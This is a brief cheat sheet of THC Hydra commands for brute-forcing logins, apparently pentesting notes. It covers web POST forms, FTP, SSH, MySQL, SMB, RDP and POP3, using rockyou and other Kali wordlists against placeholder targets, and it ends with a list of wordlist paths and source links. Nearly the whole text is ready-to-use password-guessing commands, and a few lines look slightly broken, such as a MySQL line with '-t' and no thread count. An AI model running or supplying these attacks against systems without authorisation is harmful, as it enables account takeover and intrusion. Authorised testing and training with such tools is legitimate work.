# Brute Force THCHydra

## HTTP Post Web Form

$ hydra -l user -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/Login Page:Request Body:Error Message"

$ hydra -l admin -P /dir/passwd-list.txt http://example.com  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V

$ hydra -l molly -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

$hydra -l admin -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"

$hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"

## FTP

$ hydra -l user-name -P /usr/share/wordlists/rockyou.txt Target_IP ftp

$ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt ftp://Target_IP

## SSH

$ hydra -f -l user_name -P /usr/share/wordlists/rockyou.txt Target_IP ssh

$ hydra -l user_name -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 ssh

$ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt ssh://IP_Address:2222

## MySQL

$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt Target_IP -t mysql

## SMB

$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt Target_IP -t 4 smb

## RDP

$ hydra -l username -P /usr/share/wordlists/rockyou.txt Target_IP rdp

$ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt -t 4 -W 3 rdp://IP_Address:33389/

## POP3

$hydra -f -l user-name -P /usr/share/wordlists/fasttrack.txt Target_IP pop3

## Dir Kali Passwords Wordlists

/usr/share/wordlists/rockyou.txt

/usr/share/wordlists/fasttrack.txt

/usr/share/wordlists/john.lst

/usr/share/wordlists/nmap.lst

/usr/share/wordlists/legion

## Links

Fonte: https://www.stationx.net/how-to-use-hydra

Fonte: https://www.kali.org/tools/hydra

Fonte: https://github.com/vanhauser-thc/thc-hydra
